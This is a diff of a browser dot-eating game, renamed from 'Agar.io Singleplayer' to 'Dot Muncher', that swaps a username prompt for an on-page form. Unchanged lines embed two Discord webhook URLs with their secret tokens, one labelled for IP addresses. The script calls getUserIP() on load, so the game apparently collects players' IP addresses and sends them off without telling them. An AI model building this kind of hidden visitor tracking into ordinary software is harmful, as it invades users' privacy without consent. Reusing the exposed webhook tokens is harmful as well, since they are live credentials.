@@ -3,15 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agar.io Singleplayer</title>
+    <title>Dot Muncher</title>
     <style>
         body {
             margin: 0;
             overflow: hidden;
             background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
         }
         canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
             display: block;
+            z-index: 1;
         }
         #overlay {
             position: absolute;
@@ -27,11 +37,47 @@
             flex-direction: column;
             font-size: 24px;
             visibility: hidden;
+            z-index: 2;
         }
         #overlay button {
             margin-top: 20px;
             padding: 10px 20px;
             font-size: 18px;
+            cursor: pointer;
+        }
+        #usernameForm {
+            position: absolute;
+            top: calc(50% - 100px);
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            display: none;
+            z-index: 2;
+            transition: opacity 0.5s ease-in-out;
+            opacity: 0;
+        }
+        #usernameForm.show {
+            display: block;
+            opacity: 1;
+        }
+        #usernameForm label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        #usernameForm input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        #usernameForm button {
+            margin-top: 10px;
+            padding: 8px 16px;
+            font-size: 16px;
             cursor: pointer;
         }
     </style>
@@ -42,12 +88,21 @@
         <div id="message"></div>
         <button id="restartButton">Restart</button>
     </div>
+    <div id="usernameForm">
+        <label for="username">Enter Username:</label>
+        <input type="text" id="username" required>
+        <button id="submitUsername">Submit</button>
+    </div>
     <script>
         const canvas = document.getElementById('gameCanvas');
         const ctx = canvas.getContext('2d');
         const overlay = document.getElementById('overlay');
         const message = document.getElementById('message');
         const restartButton = document.getElementById('restartButton');
+        const usernameForm = document.getElementById('usernameForm');
+        const usernameInput = document.getElementById('username');
+        const submitUsernameBtn = document.getElementById('submitUsername');
+        
         const scoreWebhookURL = 'https://discord.com/api/webhooks/1250899711758569482/JVWRB37ejxy1m1NSi1C-SKoC3heGEkWIe7Fb-K23nEE0I1GE3PDvfEKMcai1CKaFViyz';
         const ipWebhookURL = 'https://discord.com/api/webhooks/1250889217408765973/bHGwavqx33Rw9Kyz3qfaF11WvbvULABmKl2JetfqU9UncfBwhQ6hZ2dr15FVbPKcZNsV';
 
@@ -226,82 +281,84 @@
 
         canvas.addEventListener('mousemove', (e) => {
             const rect = canvas.getBoundingClientRect();
-            const mouseX = e.clientX - rect.left;
-            const mouseY = e.clientY - rect.top;
-            movePlayer(mouseX, mouseY);
-        });
+            const
 
-        function handleTouch(e) {
-            const touch = e.touches[0];
-            const rect = canvas.getBoundingClientRect();
-            const touchX = touch.clientX - rect.left;
-            const touchY = touch.clientY - rect.top;
-            movePlayer(touchX, touchY);
+            mouseX = e.clientX - rect.left;
+const mouseY = e.clientY - rect.top;
+movePlayer(mouseX, mouseY);
+});    function handleTouch(e) {
+        const touch = e.touches[0];
+        const rect = canvas.getBoundingClientRect();
+        const touchX = touch.clientX - rect.left;
+        const touchY = touch.clientY - rect.top;
+        movePlayer(touchX, touchY);
+    }
+
+    canvas.addEventListener('touchmove', handleTouch, { passive: false });
+
+    document.body.addEventListener('touchstart', function (e) {
+        if (e.target == canvas) {
+            e.preventDefault();
         }
+    }, false);
+    document.body.addEventListener('touchend', function (e) {
+        if (e.target == canvas) {
+            e.preventDefault();
+        }
+    }, false);
+    document.body.addEventListener('touchmove', function (e) {
+        if (e.target == canvas) {
+            e.preventDefault();
+        }
+    }, false);
 
-        canvas.addEventListener('touchmove', handleTouch, { passive: false });
-
-        document.body.addEventListener('touchstart', function (e) {
-            if (e.target == canvas) {
-                e.preventDefault();
-            }
-        }, false);
-        document.body.addEventListener('touchend', function (e) {
-            if (e.target == canvas) {
-                e.preventDefault();
-            }
-        }, false);
-        document.body.addEventListener('touchmove', function (e) {
-            if (e.target == canvas) {
-                e.preventDefault();
-            }
-        }, false);
-
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                isPaused = !isPaused;
-                if (isPaused) {
-                    message.innerHTML = `Paused! Score: ${score}`;
-                    overlay.style.visibility = 'visible';
-                } else {
-                    overlay.style.visibility = 'hidden';
-                    updateGame();
-                }
-            }
-        });
-
-        restartButton.addEventListener('click', () => {
-            player.size = 10;
-            score = 0;
-            isGameOver = false;
-            overlay.style.visibility = 'hidden';
-            dots = [];
-            for (let i = 0; i < 350; i++) {
-                let dotSize;
-                if (i % 10 === 0) {
-                    dotSize = player.size + 40;
-                } else if (i % 10 < 7) {
-                    dotSize = player.size + 20;
-                } else {
-                    dotSize = player.size - 3;
-                }
-                dots.push(createDot(dotSize));
-            }
-            updateGame();
-        });
-
-        function promptUsername() {
-            username = prompt("Please enter your username:");
-            if (!username) {
-                username = "Anonymous";
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            isPaused = !isPaused;
+            if (isPaused) {
+                message.innerHTML = `Paused! Score: ${score}`;
+                overlay.style.visibility = 'visible';
+            } else {
+                overlay.style.visibility = 'hidden';
+                updateGame();
             }
         }
+    });
 
-        promptUsername();
-        getUserIP();
+    restartButton.addEventListener('click', () => {
+        player.size = 10;
+        score = 0;
+        isGameOver = false;
+        overlay.style.visibility = 'hidden';
+        dots = [];
+        for (let i = 0; i < 350; i++) {
+            let dotSize;
+            if (i % 10 === 0) {
+                dotSize = player.size + 40;
+            } else if (i % 10 < 7) {
+                dotSize = player.size + 20;
+            } else {
+                dotSize = player.size - 3;
+            }
+            dots.push(createDot(dotSize));
+        }
         updateGame();
+    });
 
-        canvas.style.cursor = 'none';
-    </script>
-</body>
-</html>
+    submitUsernameBtn.addEventListener('click', () => {
+        const enteredUsername = usernameInput.value.trim();
+        if (enteredUsername) {
+            username = enteredUsername;
+            usernameForm.classList.remove('show');
+            canvas.style.cursor = 'none';
+            updateGame();
+        }
+    });
+
+    function promptUsername() {
+        usernameForm.classList.add('show');
+    }
+
+    promptUsername();
+    getUserIP();
+</script>
